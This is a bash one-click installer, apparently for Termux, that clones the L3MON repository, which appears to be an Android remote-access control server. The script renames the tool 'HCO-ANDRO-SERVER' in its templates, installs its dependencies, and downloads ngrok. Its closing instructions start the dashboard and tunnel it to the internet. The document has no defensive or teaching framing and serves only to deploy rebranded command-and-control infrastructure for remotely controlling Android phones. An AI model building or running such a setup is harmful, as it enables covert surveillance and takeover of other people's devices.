#!/bin/bash
# ==========================================
# TOOL: HCO-ANDRO-SERVER (One-Click Edition)
# ==========================================

echo -e "\e[1;32m[+] Starting Elite Installation...\e[0m"

# 1. System Update & Dependencies
apt update && apt upgrade -y
pkg install nodejs git python openjdk-17 wget -y
npm install pm2 -g

# 2. Automated Core Setup
echo -e "\e[1;34m[+] Building Server Engine...\e[0m"
git clone https://github.com/D3VL/L3MON.git .temp_engine
mv .temp_engine/* . && rm -rf .temp_engine
sed -i 's/L3MON/HCO-ANDRO-SERVER/g' server/views/*.ejs

# 3. Fast NPM Install
cd server && npm install && cd ..

# 4. Integrated Ngrok (Cloud Tunnel)
echo -e "\e[1;33m[+] Setting up Cloud Access (Ngrok)...\e[0m"
if [ ! -f "ngrok" ]; then
    wget https://bin.equinox.io/c/4VmD4z7iaB/ngrok-stable-linux-arm64.tgz
    tar -xvzf ngrok-stable-linux-arm64.tgz && rm ngrok-stable-linux-arm64.tgz
fi

echo -e "\e[1;32m"
echo "───────────────────────────────────────────────"
echo "✅ INSTALLATION FINISHED!"
echo "1. Start Dashboard: pm2 start server/index.js"
echo "2. Start Cloud: ./ngrok http 22533"
echo "───────────────────────────────────────────────"
echo -e "\e[0m"
